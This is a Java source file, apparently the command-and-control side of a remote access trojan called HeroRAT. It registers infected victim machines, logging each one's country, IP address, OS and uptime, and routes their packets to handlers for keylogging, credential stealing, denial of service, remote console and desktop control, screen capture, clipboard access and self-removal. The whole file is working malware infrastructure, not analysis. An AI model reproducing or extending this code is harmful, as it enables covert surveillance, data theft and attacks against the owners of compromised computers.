package net.herorat.features.servers;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;

import net.herorat.Main;
import net.herorat.features.blocker.Blocker;
import net.herorat.features.chat.Chat;
import net.herorat.features.clipboard.Clipboard;
import net.herorat.features.console.Console;
import net.herorat.features.dos.Dos;
import net.herorat.features.file.File;
import net.herorat.features.keylogger.Keylogger;
import net.herorat.features.message.Message;
import net.herorat.features.ping.Ping;
import net.herorat.features.process.Process;
import net.herorat.features.remote.Remote;
import net.herorat.features.screen.Screen;
import net.herorat.features.shutdown.Shutdown;
import net.herorat.features.stealer.Stealer;
import net.herorat.features.suicide.Suicide;
import net.herorat.features.system.System;
import net.herorat.features.urlvisit.UrlVisit;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet10Screen;
import net.herorat.network.Packet11Stealer;
import net.herorat.network.Packet12Urlvisit;
import net.herorat.network.Packet13Shutdown;
import net.herorat.network.Packet14Blocker;
import net.herorat.network.Packet15Clipboard;
import net.herorat.network.Packet16Remote;
import net.herorat.network.Packet17Suicide;
import net.herorat.network.Packet1Ping;
import net.herorat.network.Packet2Console;
import net.herorat.network.Packet3Dos;
import net.herorat.network.Packet4Keylogger;
import net.herorat.network.Packet5Chat;
import net.herorat.network.Packet6File;
import net.herorat.network.Packet7System;
import net.herorat.network.Packet8Message;
import net.herorat.network.Packet9Process;
import net.herorat.utils.Crypto;


public class Server extends Thread
{
	private String id;
	private String country;
	private String ip;
	private String name;
	private String os;
	private String timestamp_start;
	private String ping = "999";
	private String comment;
	private String password;
	
	private Socket socket;
	private InputStream input;
	private OutputStream output;
	public DataInputStream inputstream;
	public DataOutputStream outputstream;
	
	// Tabs saves
	public StringBuffer buffer_console;
	public StringBuffer buffer_chat;
	public StringBuffer buffer_logger;
	public ArrayList<String[]> array_process;
	
	public Server(Socket socket)
	{
		try
		{
			this.socket = socket;
			this.input = this.socket.getInputStream();
			this.output = this.socket.getOutputStream();
			this.inputstream = new DataInputStream(this.input);
			this.outputstream = new DataOutputStream(this.output);
			
			this.buffer_console = new StringBuffer();
			this.buffer_chat = new StringBuffer();
			buffer_logger = new StringBuffer();
			this.array_process = new ArrayList<String[]>();
			
			this.ip = socket.getInetAddress().getHostAddress();
		
			int packet_id = this.inputstream.readInt();
			int size = this.inputstream.readInt();
			if (packet_id == 0 && size == 1)
			{
				parse( new String(Crypto.decrypt(Crypto.hexToByte(this.inputstream.readUTF()))) );
			}
		}
		catch (Exception e) {}
	}
	
	private void parse(String data)
	{
		String[] params = data.split("###");
		
		id = params[0];
		country = params[1];
		name = params[2];
		os = params[3];
		timestamp_start = params[4];
		password = params[5];
	}
	
	public void setPing(long delay)
	{
		this.ping = String.valueOf(delay);
	}
	
	public String getComment()
	{
		return this.comment;
	}
	
	public void setComment(String comment)
	{
		this.comment = comment;
	}
	
	public boolean isAuth(String password)
	{
		return (this.password.equals(password));
	}
	
	public String getUid()
	{
		return id;
	}
	
	public String getServerName()
	{
		return name;
	}
	
	public String getIp()
	{
		return ip;
	}
	
	public String getOs()
	{
		return os;
	}
	
	public String getUptime()
	{
		long ms = new Date().getTime() - Long.parseLong(timestamp_start);
		int seconds = (int) (ms / 1000) % 60 ;
		int minutes = (int) ((ms / (1000*60)) % 60);
		int hours   = (int) ((ms / (1000*60*60)) % 24);
		int days   = (int) (ms / (1000*60*60*24));
		return (days < 10 ? "0" + days : days) +"d "+ (hours < 10 ? "0" + hours : hours) +":"+ (minutes < 10 ? "0" + minutes : minutes) +":"+ (seconds < 10 ? "0" + seconds : seconds);
	}
	
	public String getPing()
	{
		return ping;
	}
	
	public String[] getRowData()
	{
		Ping.send(this);
		return new String[] { country.toUpperCase(), ip, name, os, getUptime(), ping, id, comment };
	}
	
	public void disconnect()
	{
		for (int i=0; i<Main.mainWindow.panel_tab2.model_servers.getRowCount(); i++)
		{
			if (Main.mainWindow.panel_tab2.model_servers.getValueAt(i, 6).toString().equalsIgnoreCase(this.getUid()))
			{
				Main.mainWindow.panel_tab2.model_servers.removeRow(i);
			}
		}
		
		int pos = Network.getServerPositionInList(this);
		if (pos > 0)
		{
			Main.mainWindow.panel_tab3.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab4.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab5.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab6.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab7.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab8.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab9.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab10.combo_select.removeItemAt(pos);
			Main.mainWindow.panel_tab11.combo_select.removeItemAt(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab3.combo_selected_item)))
		{
			Main.mainWindow.panel_tab3.combo_selected_item = "";
			Main.mainWindow.panel_tab3.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab3.combo_selected_item));
			Main.mainWindow.panel_tab3.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab4.combo_selected_item)))
		{
			Main.mainWindow.panel_tab4.combo_selected_item = "";
			Main.mainWindow.panel_tab4.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab4.combo_selected_item));
			Main.mainWindow.panel_tab4.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab5.combo_selected_item)))
		{
			Main.mainWindow.panel_tab5.combo_selected_item = "";
			Main.mainWindow.panel_tab5.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab5.combo_selected_item));
			Main.mainWindow.panel_tab5.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab6.combo_selected_item)))
		{
			Main.mainWindow.panel_tab6.combo_selected_item = "";
			Main.mainWindow.panel_tab6.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab6.combo_selected_item));
			Main.mainWindow.panel_tab6.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab7.combo_selected_item)))
		{
			Main.mainWindow.panel_tab7.combo_selected_item = "";
			Main.mainWindow.panel_tab7.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab7.combo_selected_item));
			Main.mainWindow.panel_tab7.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab8.combo_selected_item)))
		{
			Main.mainWindow.panel_tab8.combo_selected_item = "";
			Main.mainWindow.panel_tab8.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab8.combo_selected_item));
			Main.mainWindow.panel_tab8.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab9.combo_selected_item)))
		{
			Main.mainWindow.panel_tab9.combo_selected_item = "";
			Main.mainWindow.panel_tab9.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab9.combo_selected_item));
			Main.mainWindow.panel_tab9.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab10.combo_selected_item)))
		{
			Main.mainWindow.panel_tab10.combo_selected_item = "";
			Main.mainWindow.panel_tab10.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab10.combo_selected_item));
			Main.mainWindow.panel_tab10.combo_select.setSelectedIndex(pos);
		}
		
		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab11.combo_selected_item)))
		{
			Main.mainWindow.panel_tab11.combo_selected_item = "";
			Main.mainWindow.panel_tab11.combo_select.setSelectedIndex(0);
		}
		else
		{
			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab11.combo_selected_item));
			Main.mainWindow.panel_tab11.combo_select.setSelectedIndex(pos);
		}

		try
		{
			this.inputstream.close();
			this.outputstream.close();
			this.input.close();
			this.output.close();
			this.socket.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		
		Network.servers.remove(this.getUid());
	}
	
	public void run()
	{
		while (true)
		{
			try
			{
				Packet packet;
				int packet_id = inputstream.readInt();
				switch (packet_id)
				{
					case 1:
						packet = new Packet1Ping(inputstream);
						Ping.handle(this, packet.read());						// OK
						break;
					case 2:
						packet = new Packet2Console(inputstream);
						Console.handle(this, packet.read());					// OK
						break;
					case 3:
						packet = new Packet3Dos(inputstream);
						Dos.handle(this, packet.read());						// OK
						break;
					case 4:
						packet = new Packet4Keylogger(inputstream);
						Keylogger.handle(this, packet.read());					// OK
						break;
					case 5:
						packet = new Packet5Chat(inputstream);
						Chat.handle(this, packet.read());						// OK
						break;
					case 6:
						packet = new Packet6File(inputstream);
						File.handle(this, packet.read());						// OK
						break;
					case 7:
						packet = new Packet7System(inputstream);
						System.handle(this, packet.read());						// OK
						break;
					case 8:
						packet = new Packet8Message(inputstream);
						Message.handle(this, packet.read());					// OK
						break;
					case 9:
						packet = new Packet9Process(inputstream);
						Process.handle(this, packet.read());					// OK
						break;
					case 10:
						packet = new Packet10Screen(inputstream);
						Screen.handle(this, packet.read());						// OK
						break;
					case 11:
						packet = new Packet11Stealer(inputstream);
						Stealer.handle(this, packet.read());					// OK
						break;
					case 12:
						packet = new Packet12Urlvisit(inputstream);
						UrlVisit.handle(this, packet.read());					// OK
						break;
					case 13:
						packet = new Packet13Shutdown(inputstream);
						Shutdown.handle(this, packet.read());					// OK
						break;
					case 14:
						packet = new Packet14Blocker(inputstream);
						Blocker.handle(this, packet.read());					// OK
						break;
					case 15:
						packet = new Packet15Clipboard(inputstream);
						Clipboard.handle(this, packet.read());					// OK
						break;
					case 16:
						packet = new Packet16Remote(inputstream);
						Remote.handle(this, packet.read());						// OK
						break;
					case 17:
						packet = new Packet17Suicide(inputstream);
						Suicide.handle(this, packet.read());					// OK
						break;
				}
			}
			catch (Exception e)
			{
				this.disconnect();
			}
		}
	}
}
